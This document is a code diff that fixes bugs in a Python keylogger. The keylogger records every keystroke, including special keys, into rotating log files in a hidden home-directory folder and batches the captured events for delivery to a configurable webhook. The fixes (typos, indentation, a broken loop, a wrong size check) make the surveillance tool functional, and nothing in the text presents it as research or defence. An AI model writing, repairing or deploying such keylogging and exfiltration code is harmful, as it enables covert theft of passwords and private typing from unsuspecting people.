@@ -17,7 +17,7 @@ from enum import (
 )
 from threading import (
     Event,
-    auto,
+    Lock,
 )
 from pathlib import Path
 from datetime import datetime
@@ -63,7 +63,7 @@ SPECIAL_KEYS: dict[Key, str] = {
     Key.backspace: "[BACKSPACE]",
     Key.delete: "[DELETE]",
     Key.shift: "[SHIFT]",
-    Key.shifr_r: "[SHIFT]",
+    Key.shift_r: "[SHIFT]",
     Key.ctrl: "[CTRL]",
     Key.ctrl_r: "[CTRL]",
     Key.alt: "[ALT]",
@@ -91,7 +91,7 @@ class KeyloggerConfig:
     """
     Runtime configuration for keylogger behavior
     """
-    log_dir: Path.home() / ".keylogger_logs"
+    log_dir: Path = Path.home() / ".keylogger_logs"
     log_file_prefix: str = "keylog"
     max_log_size_mb: float = 5.0
     webhook_url: str | None = None
@@ -214,7 +214,7 @@ class LogManager:
         self._file = open(
             self.current_log_path,
             'a',
-            encoding='utf-8',
+            encoding = 'utf-8',
         )
 
     def _get_new_log_path(self) -> Path:
@@ -230,7 +230,7 @@ class LogManager:
         Write a keyboard event to the log file
         """
         with self._lock:
-            self._file.write(evnet.to_log_string() + '\n')
+            self._file.write(event.to_log_string() + '\n')
             self._file.flush()
             self._check_rotation()
 
@@ -244,7 +244,7 @@ class LogManager:
             self._rotate()
             return
 
-        if (size / BYTES_PER_MB >= self.config.max_log_size_mb.stat().st_size):
+        if (size / BYTES_PER_MB >= self.config.max_log_size_mb):
             self._rotate()
 
     def _rotate(self) -> None:
@@ -295,8 +295,7 @@ class WebhookDelivery:
         batch: list[KeyEvent] | None = None
         with self.buffer_lock:
             self.event_buffer.append(event)
-            if (len(self.event_buffer)
-                    >= self.config.webhook_batch_size):
+            if (len(self.event_buffer) >= self.config.webhook_batch_size):
                 batch = self.event_buffer
                 self.event_buffer = []
         
@@ -390,14 +389,14 @@ class Keylogger:
         """
         Convert key to string representation and type
         """
-    if isinstance(key, Key):
-        lable = SPECIAL_KEYS.get(key)
-        if lable:
-            return lable, KeyType.SPECIAL
-        return (
-            f"{key.name.upper()}",
-            KeyType.SPECIAL,
-        )
+        if isinstance(key, Key):
+            lable = SPECIAL_KEYS.get(key)
+            if lable:
+                return lable, KeyType.SPECIAL
+            return (
+                f"{key.name.upper()}",
+                KeyType.SPECIAL,
+            )
 
         if hasattr(key, 'char') and key.char:
             return key.char, KeyType.CHAR
@@ -475,14 +474,12 @@ class Keylogger:
         self.is_running.set()
         self.is_logging.set()
 
-        self.listener = keyboard.Listener(on_press = self._on_press)
+        self.listener = keyboard.Listener(on_press=self._on_press)
         self.listener.start()
 
         try:
-            with self.is_running.is_set():
-                self.listener.join(
-                    timeout = (LISTENER_JOIN_TIMEOUT_SECS)
-                )
+            while self.is_running.is_set():
+                self.listener.join(timeout=LISTENER_JOIN_TIMEOUT_SECS)
         except KeyboardInterrupt:
             self.stop()
 
@@ -509,7 +506,7 @@ def main() -> None:
     """
     Entry point with default configuration
     """
-    keylogger = Keylogger(KeyloggerConfig)
+    keylogger = Keylogger(KeyloggerConfig())
 
     try:
         keylogger.start()
@@ -517,5 +514,5 @@ def main() -> None:
         print(f"\n[!] Error {e}")
         keylogger.stop()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()  
